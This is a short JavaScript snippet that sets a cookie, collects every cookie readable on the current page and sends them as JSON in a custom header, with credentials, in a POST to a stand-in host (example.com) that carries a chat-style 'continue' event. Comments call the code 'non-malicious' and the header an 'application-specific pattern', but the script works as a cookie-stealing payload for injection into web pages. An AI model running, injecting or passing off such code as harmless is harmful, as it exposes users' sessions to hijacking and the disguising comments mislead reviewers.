// --- Function to set a simple cookie ---
/**
 * Sets a non-malicious cookie with a specified expiration time.
 * @param {string} name - The name of the cookie.
 * @param {string} value - The value of the cookie.
 * @param {number} days - The number of days until the cookie expires.
 */
function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    // Set a standard cookie
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
    console.log(`Cookie '${name}' created!`);
}


// --- Execute Cookie Creation ---
setCookie("interactionId", "0017dfcc-22fc-418a-9cd6-5ad1f338e65c", 7);


// --- Standard XMLHttpRequest (AJAX) Setup ---
var xhr = new XMLHttpRequest();
// NOTE: Using a hypothetical URL for demonstration.
var url = "https://example.com/api/customHtmlMessage"; 

xhr.open("POST", url, true);

// Standard Headers
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("Accept", "*/*");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");


// Parse existing cookies from the current domain into a JSON object
var cookies = {};
if (document.cookie) {
    document.cookie.split(';').forEach(function(c) {
        var parts = c.split('=');
        var name = parts.shift().trim();
        var value = decodeURIComponent(parts.join('='));
        if (name) cookies[name] = value;
    });
}

// NOTE: Sending cookies in a custom header is an application-specific pattern.
xhr.setRequestHeader("Origin-Cookies", encodeURIComponent(JSON.stringify(cookies)));

// Ensures the browser sends cookies in the standard 'Cookie' header if same-origin or allowed by CORS
xhr.withCredentials = true;

xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        console.log("XHR Request Complete:");
        console.log("Status:", xhr.status);
        console.log("Response:", xhr.responseText);
    }
};

var data = JSON.stringify({
    "nextEvent": {
        "constructType": "skEvent",
        "eventName": "continue",
        "params": [],
        "eventType": "post",
        "postProcess": {}
    },
    "eventName": "continue",
    "id": "i28tpfcdwe"
});

// Send the request
xhr.send(data);




